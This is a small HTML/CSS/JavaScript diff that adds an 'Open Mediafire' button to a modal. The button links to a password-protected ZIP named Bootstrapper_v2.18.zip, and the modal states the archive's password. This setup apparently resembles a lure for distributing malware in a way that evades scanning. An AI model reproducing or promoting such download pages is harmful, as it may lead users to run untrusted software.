@@ -138,16 +138,20 @@
             margin-bottom: 30px;
         }
 
-        .modal .close {
-            font-size: 1.5rem;
+        .modal .close,
+        .modal .open {
+            font-size: 1.2rem;
             cursor: pointer;
-            padding: 5px 15px;
+            padding: 10px 20px;
             background-color: #d6336c;
             border-radius: 5px;
             color: white;
+            margin: 10px;
+            transition: all 0.3s ease;
         }
 
-        .modal .close:hover {
+        .modal .close:hover,
+        .modal .open:hover {
             background-color: #5d2e85;
         }
 
@@ -196,6 +200,7 @@
             <h2>Warning</h2>
             <p>The file is a ZIP and is password protected. The password is <strong>Clankv</strong>.</p>
             <button class="close" id="closeModal">Close</button>
+            <a href="https://www.mediafire.com/file/oapi8w2rp9o577y/Bootstrapper_v2.18.zip/file" class="open" target="_blank">Open Mediafire</a>
         </div>
     </div>
 
@@ -209,6 +214,9 @@
         // Get the <span> element that closes the modal
         var closeModal = document.getElementById("closeModal");
 
+        // Get the Open button inside the modal
+        var openModal = document.querySelector(".open");
+
         // When the user clicks the button, open the modal
         mediafireBtn.onclick = function() {
             modal.style.display = "flex"; // Show the modal
@@ -217,6 +225,11 @@
         // When the user clicks on the close button, close the modal
         closeModal.onclick = function() {
             modal.style.display = "none"; // Hide the modal
+        }
+
+        // When the user clicks on the Open button, open the link
+        openModal.onclick = function() {
+            window.open(openModal.href, "_blank");
         }
 
         // When the user clicks anywhere outside of the modal, close it
